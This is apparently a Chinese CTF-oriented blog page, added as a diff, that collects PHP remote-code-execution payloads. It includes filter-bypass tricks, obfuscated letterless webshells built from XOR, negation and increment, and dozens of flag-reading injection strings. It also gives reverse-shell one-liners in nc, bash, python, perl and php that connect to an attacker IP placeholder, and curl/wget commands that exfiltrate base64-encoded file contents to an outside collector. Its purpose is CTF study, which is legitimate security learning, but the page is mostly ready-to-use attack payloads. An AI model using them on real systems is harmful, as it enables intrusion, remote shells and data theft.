@@ -1,0 +1,802 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>rce总结 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="代码执行eval() assert()  preg_replace(a,b,c) :c中被a的要求匹配时。匹配部分以b(此时执行)替换 create_function  动态调用：变量当做函数用 回调函数 call_user_func(a,b) 例子：a:assert（不能是eval或是echo这种语言结构），b:$GET_[‘cmd’] call_user_func_array(a,b) b是数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rce总结">
+<meta property="og:url" content="https://theganlove.github.io/2024/09/01/rce%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="代码执行eval() assert()  preg_replace(a,b,c) :c中被a的要求匹配时。匹配部分以b(此时执行)替换 create_function  动态调用：变量当做函数用 回调函数 call_user_func(a,b) 例子：a:assert（不能是eval或是echo这种语言结构），b:$GET_[‘cmd’] call_user_func_array(a,b) b是数">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-09-01T06:42:00.000Z">
+<meta property="article:modified_time" content="2024-09-01T08:53:42.272Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://theganlove.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-rce总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/09/01/rce%E6%80%BB%E7%BB%93/" class="article-date">
+  <time class="dt-published" datetime="2024-09-01T06:42:00.000Z" itemprop="datePublished">2024-09-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      rce总结
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><ul>
+<li>assert() </li>
+<li>preg_replace(a,b,c) :c中被a的要求匹配时。匹配部分以b(此时执行)替换</li>
+<li>create_function </li>
+<li>动态调用：变量当做函数用</li>
+<li>回调函数 call_user_func(a,b) 例子：a:assert（不能是eval或是echo这种语言结构），b:$GET_[‘cmd’]<ul>
+<li>call_user_func_array(a,b) b是数组数组中的元素会按照顺序依次作为参数传递给指定的函数或方法<ul>
+<li>例如：function add($x, $y) $params &#x3D; [2, 3];$result &#x3D; call_user_func_array(‘add’, $params);</li>
+</ul>
+</li>
+<li>array_filter(a,b) a数组b函数</li>
+<li>array_map(a,b)  a函数b数组</li>
+<li>${php代码}</li>
+</ul>
+</li>
+</ul>
+<h2 id="paylpd：eval-传入字符串解释其为php代码执行"><a href="#paylpd：eval-传入字符串解释其为php代码执行" class="headerlink" title="paylpd：eval()传入字符串解释其为php代码执行"></a>paylpd：eval()传入字符串解释其为php代码执行</h2><ul>
+<li>转接头写法：eval($GET_[1])    访问…&#x2F;?1&#x3D;eval($POET_[1]);链接蚁剑<ul>
+<li>…&#x2F;?1&#x3D;$a&#x3D;’sys’;$b&#x3D;’tem’;$c&#x3D;$a.$b;$c($POST_[1])		post：1&#x3D;ls &#x2F;</li>
+<li><?`$_GET[1]`;&1=nc 43.323.323.2323 4444 -e /bin/bash    攻击方：nc -lvnp 4444
+- bash -i >& /dev/tcp/<攻击者IP>/4444 0>&1
+- python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<攻击者IP>",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]);'
+- perl -e 'use Socket;$i="<攻击者IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+- php -r '$sock=fsockopen("<攻击者IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</li>
+<li>经典读文件函数<ul>
+<li>file_get_contents()</li>
+<li>highlight_file()</li>
+<li>fopen()</li>
+<li>readfile()</li>
+<li>fread()</li>
+<li>fgetss()</li>
+<li>fgets()</li>
+<li>parse_ini_file()</li>
+<li>show_source()</li>
+<li>file()</li>
+<li>var_dump(scandir(‘&#x2F;‘));	</li>
+<li>&#x2F;var&#x2F;www&#x2F;html&#x2F;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><ul>
+<li>位点：	system(“”)	里面写命令liunx，保证让系统看出是字符串<ul>
+<li>passthru</li>
+<li>exec</li>
+<li>shell_exec没有回显的执行函数或者设置&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1等无回显</li>
+<li>popen</li>
+<li>pcntl_exec</li>
+</ul>
+</li>
+<li>liunx系统操作：<ul>
+<li>find &#x2F; -name flag*  &#x2F;&#x2F;没有flag。没关系我们用<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-find.html">find</a>命令从根目录开始找。</li>
+<li>pwd: 显示当前工作目录的路径。</li>
+<li>ls: 列出当前目录中的文件和目录。<ul>
+<li>ls -l  # 显示详细信息</li>
+<li>ls -a  # 显示隐藏文件</li>
+<li>ls -la合体</li>
+</ul>
+</li>
+<li>cd: 切换目录。<ul>
+<li>cd ..  # 返回上一级目录</li>
+<li>cd ~  # 返回用户主目录</li>
+</ul>
+</li>
+<li>cp: 复制文件或目录。<ul>
+<li>cp source_file destination_file  # 复制文件</li>
+<li>cp -r source_directory destination_directory  # 复制目录</li>
+</ul>
+</li>
+<li>mv: 移动或重命名文件和目录。<ul>
+<li>mv old_name new_name  # 重命名文件或目录</li>
+<li>mv file_name &#x2F;path&#x2F;to&#x2F;directory  # 移动文件</li>
+</ul>
+</li>
+<li>rm: 删除文件或目录<ul>
+<li>rm file_name  # 删除文件</li>
+<li>rm -r directory_name  # 删除目录</li>
+</ul>
+<p>				</p>
+</li>
+<li>mkdir: 创建新目录。					<ul>
+<li>mkdir new_directory</li>
+</ul>
+</li>
+<li>rmdir: 删除空目录。<ul>
+<li>rmdir directory_name</li>
+</ul>
+</li>
+<li>cat: 显示文件内容。<ul>
+<li>cat file_name</li>
+</ul>
+<p>					</p>
+</li>
+<li>more: 分页显示文件内容<ul>
+<li>more file_name</li>
+</ul>
+</li>
+<li>less: 分页显示文件内容，支持向前滚动。<ul>
+<li>less file_name</li>
+</ul>
+</li>
+<li>head: 显示文件的前几行。<ul>
+<li>head file_name</li>
+<li>head -n 10 file_name  # 显示文件的前10行</li>
+</ul>
+</li>
+<li>显示文件的后几行</li>
+<li>tail: 显示文件的后几行。<ul>
+<li>tail file_name</li>
+<li>tail -n 10 file_name  # 显示文件的后10行</li>
+</ul>
+</li>
+<li>nano: 简单的文本编辑器。<ul>
+<li>nano file_name</li>
+</ul>
+</li>
+<li>功能强大的文本编辑器</li>
+<li>vi 或 vim: 功能强大的文本编辑器。<ul>
+<li>vi file_name</li>
+<li>vim file_name</li>
+</ul>
+</li>
+<li>top: 动态显示系统的运行信息，包括进程、CPU、内存使用情况。<ul>
+<li>ps aux  # 显示所有进程的详细信息</li>
+</ul>
+</li>
+<li>kill: 终止进程。<ul>
+<li>kill process_id  # 终止指定进程</li>
+<li>kill -9 process_id  # 强制终止指定进程</li>
+</ul>
+</li>
+<li>df: 显示文件系统的磁盘使用情况。<ul>
+<li>df</li>
+<li>df -h  # 以人类可读的方式显示</li>
+</ul>
+</li>
+<li>du: 显示目录或文件的磁盘使用情况。<ul>
+<li>du -h  # 以人类可读的方式显示</li>
+<li>du -sh directory_name  # 显示目录总大小</li>
+</ul>
+</li>
+<li>ping: 测试网络连接。<ul>
+<li>ping hostname_or_ip</li>
+</ul>
+</li>
+<li>ifconfig: 显示或配置网络接口（需要root权限）。<ul>
+<li>ifconfig</li>
+<li>显示网络连接、路由表、接口状态等</li>
+</ul>
+</li>
+<li>netstat: 显示网络连接、路由表、接口状态等。<ul>
+<li>netstat</li>
+<li>netstat -an  # 显示所有连接</li>
+</ul>
+</li>
+<li>ssh: 通过SSH协议远程登录。<ul>
+<li>ssh user@hostname_or_ip</li>
+<li>通过SSH协议传输文件</li>
+</ul>
+</li>
+<li>scp: 通过SSH协议传输文件。<ul>
+<li>scp local_file user@hostname_or_ip:&#x2F;path&#x2F;to&#x2F;remote_directory</li>
+<li>scp user@hostname_or_ip:&#x2F;path&#x2F;to&#x2F;remote_file local_directory</li>
+</ul>
+</li>
+<li>nc: 建立TCP连接。<ul>
+<li>nc <hostname> <port></li>
+<li>nc localhost 80  # 连接到本地的80端口</li>
+</ul>
+</li>
+<li>nc: 监听TCP端口。<ul>
+<li>nc -l -p <port></li>
+<li>nc -l -p 1234  # 监听本地的1234端口</li>
+</ul>
+</li>
+<li>发送文件：<ul>
+<li>nc <hostname> <port> &lt; <file></li>
+<li>nc remote_host 1234 &lt; file.txt  # 将file.txt发送到远程主机的1234端口</li>
+</ul>
+</li>
+<li>接收文件：			<ul>
+<li>nc -l -p <port> &gt; <file></li>
+<li>nc -l -p 1234 &gt; received_file.txt  # 在本地监听1234端口并接收文件到received_file.txt</li>
+</ul>
+</li>
+<li>nc: 端口扫描。<ul>
+<li>nc -zv <hostname> <start_port>-<end_port></li>
+<li>nc -zv localhost 80-100  # 扫描本地的80到100端口</li>
+</ul>
+</li>
+<li>Curl (curl)				<ul>
+<li>curl: 下载文件。<ul>
+<li>curl -O <URL></li>
+<li>curl -O <a target="_blank" rel="noopener" href="http://example.com/file.txt">http://example.com/file.txt</a>  # 下载一个文件</li>
+</ul>
+</li>
+<li>curl: 上传文件。<ul>
+<li>curl -T <file> <URL></li>
+<li>curl -T file.txt <a href="ftp://ftp.example.com/">ftp://ftp.example.com/</a>  # 将file.txt上传到FTP服务器</li>
+<li>发送GET请求</li>
+</ul>
+</li>
+<li>curl: 发送GET请求。				<ul>
+<li>curl <URL></li>
+<li>curl <a target="_blank" rel="noopener" href="http://api.example.com/data">http://api.example.com/data</a>  # 发送</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>sh命令会将文件中的内容当作命令来执行</li>
+<li>执行命令时，可以在没有写完的命令后面加\，实现将一条命令多行化，以行末没有\为终止，如下相当于执行了cat flag.txt</li>
+<li>ca\     t f\      lag.\  txt</li>
+<li>linux中,利用rev可将文件内容倒置，同时可以配合&gt;,*使用echo ‘123456’ &gt; test.txt：创建文件 test.txt 并写入内容 123456。</li>
+<li>rev test.txt：反转文件 test.txt 的内容，输出 654321。</li>
+<li>输入 * 并按回车：Shell 将 * 展开为 rev test.txt 并执行，输出 654321。</li>
+<li><ul>
+<li><blockquote>
+<p>a.txt：Shell 将 * 展开为 rev test.txt 并执行，将输出重定向到 a.txt。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>cat a.txt：查看 a.txt 文件的内容，输出 654321。</li>
+<li><blockquote>
+<p>rev：创建一个空文件名为 rev 的文件，如果 rev 文件已经存在，则会清空其内容。</p>
+</blockquote>
+</li>
+<li>linux中,dir命令和ls效果基本一样，只有配合重定向符写入文件时有一些差别，ls写入文件中时，每个文件名都是单独一行，它会自动换行，有时会影响到我们的命令执行，而dir会把内容全部写入一行中，同时会自动补全空格</li>
+</ul>
+</li>
+</ul>
+<h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><ul>
+<li>符号<ul>
+<li>;联合执行 </li>
+<li>||或  绕过黑洞</li>
+<li>&amp;&amp;与</li>
+<li>|传到</li>
+<li>?不确定</li>
+<li>*通配</li>
+<li>. &gt;命令会将原有文件内容覆盖，&gt;&gt;会将字符串添加到文件内容末尾，不会覆盖原有的内容</li>
+</ul>
+</li>
+</ul>
+<h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><ul>
+<li><p>空格   ${IFS}     $IFS$9     %09 </p>
+<p>​         在env或者printenv环境变量里找空格system(env | grep ‘ ‘)得到MYVAR&#x3D;hello world${MYVAR:5:1} 或者echo@123表示即使123出错也不要报错，echo~123取反  </p>
+</li>
+<li><p>cat过滤</p>
+<ul>
+<li>echo base64命令|base64 -d|sh 		   </li>
+<li>echo hex命令|xxd -r -p|sh </li>
+<li>换成 fmt more less rev ca\t</li>
+</ul>
+</li>
+<li><p>关键字过滤</p>
+<ul>
+<li>插入反斜线 ca\t     贴贴’c’’a’’t’  ${}拼凑关键词  插入空ca’’t</li>
+<li>对于匹配文件名用通配符[a-s]</li>
+<li>设置变量 cmd&#x3D;ab;a&#x3D;l;b&#x3D;s;$a$b</li>
+</ul>
+</li>
+<li><p>禁用;</p>
+<ul>
+<li>||代替</li>
+</ul>
+</li>
+</ul>
+<h2 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h2><ul>
+<li>preg_replace(‘&#x2F;[a-z]+((?R)?)&#x2F;‘虽然只允许无参数，但是允许函数套用。</li>
+<li>获得flag.php<ul>
+<li>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}</li>
+<li>c&#x3D;$d&#x3D;opendir(“.”);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d))){echo”$f\n”;}</li>
+<li>c&#x3D;$d&#x3D;dir(“.”);while(false!&#x3D;&#x3D;($f&#x3D;$d-&gt;read())){echo$f.”\n”;}</li>
+<li>print_r(glob(“*”)); &#x2F;&#x2F; 列当前目录</li>
+<li>print_r(glob(“&#x2F;*”)); &#x2F;&#x2F; 列根目录</li>
+<li>scandir(‘.’): &#x2F;&#x2F;获得目录 <ul>
+<li>取出. <ul>
+<li>current(localeconv())</li>
+<li>char(46)&gt;&gt;char(rand())    &#x2F;&#x2F;超多次重放</li>
+<li>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))	&#x2F;&#x2F;php7</li>
+</ul>
+</li>
+<li>操作数组：<ul>
+<li>pos() current()第一个元素</li>
+<li>end()- 将内部指针指向数组中的最后一个元素，井输出</li>
+<li>next()- 将内部指针指向数组中的下一个元素，并输出</li>
+<li>prev()- 将内部指针指向数组中的上一个元素，并输出</li>
+<li>reset()- 将内部指针指向敌组中的第一个元素，井输出</li>
+<li>each()— 返回当前元素的键名和键值，井将内部指针向前移动</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>取出文件<ul>
+<li>如果flag-php在最后一个，直接用end（）取出即可。</li>
+<li>(1)array_reverse()	&#x2F;&#x2F;转置数组<ul>
+<li>仅限于flag.php在数组的倒数第二个位置这种悄况下。</li>
+<li>?exp&#x3D;print_r(next(array_reverse(scandir(pos(localeconv()))))):</li>
+</ul>
+</li>
+<li>(2)array_rand(array_flip()) &#x2F;&#x2F;filp键值互换，rand随机取键<ul>
+<li>flag.php位置在哪都可以，但是他不是100%成功的，需要重放．概率问题</li>
+<li>?exp&#x3D;print_r(array_rand(array_flip(scandir(pos(localeconv())))));</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>session_id(session_star())   更改cookie：PHPSESSID&#x3D;flag.php	&#x2F;&#x2F;字符串有长度限制,相当于想写啥就写啥命令不能有空格，因为cookie不解析空格</li>
+<li>end(getallheaders())     &#x2F;&#x2F;得到http包最后字符串，得到任意字符串,甚至可以命令执行，套进system等函数</li>
+<li>取get的最后一个参数       end(pos(get_defined_vars()))       </li>
+<li>取post的最后一个参数      end(next(get_defined_vars()))      记得bp发包<ul>
+<li>读取flag.php<ul>
+<li>文件读取的方法<ul>
+<li>var_dump(file_get_contents())</li>
+<li>show_source()</li>
+<li>highlight_file()</li>
+<li>readfile()</li>
+</ul>
+</li>
+<li>命令执行的方法	<ul>
+<li>system(end(next(get_defined_vars())))     post传字符串传入 cat flag.php</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="无字母RCE"><a href="#无字母RCE" class="headerlink" title="无字母RCE"></a>无字母RCE</h2><ul>
+<li>php5	<ul>
+<li>异或  post传 _&#x3D;phpinfo<ul>
+<li>assert($<em>POST[</em>])	</li>
+<li><pre><code class="php">&lt;?php
+$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); $___=$$__;$_($___[_]);
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 取反  post传   2=phpinfo</span><br><span class="line">  - ```php</span><br><span class="line">    &lt;?php</span><br><span class="line">    $__=(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)+(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);$_=$__/$__;$____=&#x27;&#x27;;$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);$_____=&#x27;_&#x27;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+<li>递增运算 post传	_&#x3D;phpinfo<ul>
+<li><pre><code class="php">&lt;?php
+$_=[];$_=@&quot;$_&quot;; $_=$_[&#39;!&#39;==&#39;@&#39;]; $___=$_; $__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; $___.=$__; $__=$_;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$_=$$____;$___($_[_]); 
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- php7</span><br><span class="line">  - 取反脚本/异或脚本+动态调用</span><br><span class="line">    - 如(&#x27;phpinfo‘//取反结果)();	(&#x27;system//需要变化&#x27;)(ls/ls -la)</span><br><span class="line">    - ```php</span><br><span class="line">      $a=&#x27;phpinfo&#x27;;</span><br><span class="line">      $a();</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="通过临时文件代码执行"><a href="#通过临时文件代码执行" class="headerlink" title="通过临时文件代码执行"></a>通过临时文件代码执行</h2><ul>
+<li>强制上传表单.php中随便上传,txt文件<ul>
+<li>POST &#x2F;?cmd&#x3D;.+&#x2F;???&#x2F;???????[@-[]? HTTP&#x2F;1.1</li>
+<li>…</li>
+<li>ls &#x2F;</li>
+</ul>
+</li>
+</ul>
+<h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><ul>
+<li>反弹shell<ul>
+<li>nc 43.323.323.2323 4444 -e &#x2F;bin&#x2F;bash    攻击方：nc -lvnp 4444</li>
+<li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&lt;攻击者IP&gt;&#x2F;4444 0&gt;&amp;1</li>
+<li>python -c ‘import socket,subprocess,os; s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((“&lt;攻击者IP&gt;”,4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p&#x3D;subprocess.call([“&#x2F;bin&#x2F;bash”,”-i”]);’</li>
+<li>perl -e ‘use Socket;$i&#x3D;”&lt;攻击者IP&gt;”;$p&#x3D;4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“&#x2F;bin&#x2F;sh -i”);};’		</li>
+<li>php -r ‘$sock&#x3D;fsockopen(“&lt;攻击者IP&gt;”,4444);exec(“&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</li>
+</ul>
+</li>
+<li>curl&#x2F;wget外带数据 :<ul>
+<li>首先在自己的公网ip的网站目录下建立一个record.php的文件，里面写下如下代码：</li>
+<li>开始构造请求（读取不全的话可以进行编码<code>cat flag|base64</code>）：</li>
+<li>curl http:&#x2F;&#x2F;<em>.</em>.*.**&#x2F;record.php?data&#x3D;<code>cat flag|base64</code></li>
+<li>wget http:&#x2F;&#x2F;<em>.</em>.<em>.</em>&#x2F;record.php?data&#x3D;<code>cat flag|base64</code></li>
+<li>执行结果无回显，通过burpsuite的Collaborator 服务器记录，利用<code>curl</code>将执行结果带出来，exp如下</li>
+<li><a href="http://IP:PORT/?cmd=curl%20http://g3k199o7dxxxhsfg6mwal.burpcollaborator.net/?cmd=`cat%20/flag|base64`">http://IP:PORT/?cmd=curl%20http://g3k199o7dxxxhsfg6mwal.burpcollaborator.net/?cmd=`cat%20/flag|base64`</a></li>
+</ul>
+</li>
+<li>dnslog:<ul>
+<li>?cmd&#x3D;<code>sed -n &quot;3.4p&quot;fla?.php|base64</code>;curl ${a:10:30}.&lt;替换的dnslog&gt;</li>
+</ul>
+</li>
+<li>echo写shell或者cat flag &gt; test或者cp flag test等	</li>
+<li>我们可以使用$(sleep%091)来测试命令是否成功执行</li>
+<li>可以看到sleep 1，成功的使得页面延时了1秒返回。但是对于$(ls)，我们是无法看到回显的。这是因为使用$(ls)会把ls命令执行的结果作为参数传递给ping，ping将其作为域名进行解析，但是无法得到结果，因此把域名解析失败的错误输出到错误输出中，但php的system函数只输出了标准输出的内容，没有输出标准错误，因为我们无法看到结果。</li>
+<li>我们可以通过重定向标准错误到标准输出中，来让system函数输出错误回显，获取我们注入命令的结果。在sh中，错误描述符的编号是2，因此通过2&gt;&#x2F;dev&#x2F;stdout就可以把错误重定向到标准输出中。</li>
+<li>完整的命令为”$(ls%09&#x2F;)”%092&gt;&#x2F;dev&#x2F;stdout，该命令可以列举根目录的文件。这里双引号的作用是，ls的输出会产生换行，导致ping只会将第一个结果作为错误输出出来，因此套在双引号内部，可以将结果全部回显。</li>
+</ul>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><ul>
+<li>eval($c)	&#x2F;&#x2F;eval(“var_dump($code)”);类似于这种注意闭合<ul>
+<li>查看当前目录<ul>
+<li>c&#x3D;print_r(scandir(dirname(‘<strong>FILE</strong>‘)));</li>
+<li>print_r(scandir(dirname(<strong>FILE</strong>)));</li>
+<li>c&#x3D;system(“ls”);</li>
+</ul>
+</li>
+<li>再看根<ul>
+<li>c&#x3D;print_r(scandir(‘&#x2F;‘));</li>
+<li>c&#x3D;var_export(scandir(‘&#x2F;‘));</li>
+<li>c&#x3D;var_dump(glob(‘&#x2F;*’));</li>
+<li>c&#x3D;$a&#x3D;new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach($a as $f){echo($f-&gt;__toString().” “);}die(); &#x2F;&#x2F;有open_basedir限制</li>
+</ul>
+</li>
+<li>读取flag<ul>
+<li>?c&#x3D;system($_GET[‘a’]);&amp;a&#x3D;cat flag.php;</li>
+<li>?c&#x3D;echo <code>cat fl&#39;&#39;ag.php</code>;</li>
+<li>?c&#x3D;highlight_file(next(array_reverse(scandir(“.”))));</li>
+<li>?c&#x3D;eval(end(current(get_defined_vars())));&amp;a&#x3D;system(“cat flag.php”);</li>
+<li>?c&#x3D;passthru(‘cat &#x2F;flag_is_her3’);</li>
+<li>?c&#x3D;a&#x3D;g;cat$IFS$1fla$a.php</li>
+<li>?c&#x3D;system(“cat fl*g.php”);</li>
+<li>?c&#x3D;system(“tac fl*g.php”);</li>
+<li>?c&#x3D;print_r(file(‘flag.php’));</li>
+<li>?c&#x3D;var_dump(file(‘flag.php’));</li>
+<li>?%20num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))  &#x2F;&#x2F;对应char脚本</li>
+<li>?c&#x3D;exec(%27cat%20&#x2F;flag_is_her3%27,$array);var_dump($array);</li>
+<li>?c&#x3D;readfile(“flag.php”);</li>
+<li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgets($a);echo $line;}        &#x2F;&#x2F;一行一行读取</li>
+<li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgetc($a);echo $line;} 		&#x2F;&#x2F;一个一个字符读取</li>
+<li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while (!feof($a)) {$line &#x3D; fgetcsv($a);var_dump($line);}</li>
+<li>?c&#x3D;system(“cp fl*g.php a.txt “); 访问&#x2F;a.txt</li>
+<li>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system('tac%20f*');?></li>
+<li>?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('ls /');?></li>
+<li>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;       &#x2F;&#x2F;(<?php system("tac flag.php");?>)</li>
+<li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</li>
+<li>?c&#x3D;&#x2F;bin&#x2F;ca?${IFS}f???????</li>
+<li>?c&#x3D;&#x2F;???&#x2F;????64%20????.???  # &#x2F;bin&#x2F;base64 flag.php</li>
+<li>?c&#x3D;&#x2F;???&#x2F;???&#x2F;????2 ????????  # &#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php</li>
+<li>?c&#x3D;$a&#x3D;fopen(“flag.php”,”r”);while($b&#x3D;fgets($a)){echo $b;}</li>
+<li>?c&#x3D;system(‘echo -e “ &lt;?php \n error_reporting(0); \n  $c&#x3D; $_GET[&#39;c&#39;]; \n eval($c); “ &gt; a.php’);  访问&#x2F;a.php?c&#x3D;system(“tac flag.php”);</li>
+<li>?c&#x3D;system(“cat fl*g.php | grep  -E ‘fl.g’ “);</li>
+</ul>
+</li>
+<li>无所谓，文件包含会出手<ul>
